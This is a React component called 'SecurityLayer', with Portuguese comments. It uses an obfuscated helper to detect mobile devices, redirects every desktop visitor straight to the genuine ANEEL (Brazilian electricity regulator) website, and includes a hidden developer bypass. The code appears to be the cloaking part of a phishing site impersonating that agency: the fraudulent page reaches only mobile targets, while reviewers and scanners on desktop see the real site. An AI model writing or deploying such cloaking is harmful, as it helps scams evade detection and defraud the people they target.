import { useEffect, useState } from 'react';
import { initSecurity, _0xd45e8a as isMobileDevice } from '@/utils/securityUtils';

export function SecurityLayer() {
  const [isProtected, setIsProtected] = useState(false);
  const [isMobile, setIsMobile] = useState(true);

  useEffect(() => {
    // Verificar se é dispositivo móvel
    const mobileCheck = isMobileDevice();
    setIsMobile(mobileCheck);
    
    // Se não for dispositivo móvel, redirecionar instantaneamente
    if (!mobileCheck) {
      window.location.href = 'https://antigo.aneel.gov.br/';
      return;
    }
    
    // Inicializar camada de segurança
    try {
      initSecurity();
      setIsProtected(true);
    } catch (error) {
      console.error('Falha ao inicializar camada de segurança:', error);
    }
    
    // Criar uma função escondida para permitir bypass em ambiente de desenvolvimento
    if (process.env.NODE_ENV === 'development') {
      (window as any)._allowDesktopAccess = () => {
        localStorage.setItem('_dvt', JSON.stringify(true));
        location.reload();
      };
    }
  }, []);

  // Este componente não renderiza nada visualmente
  return null;
}

export default SecurityLayer;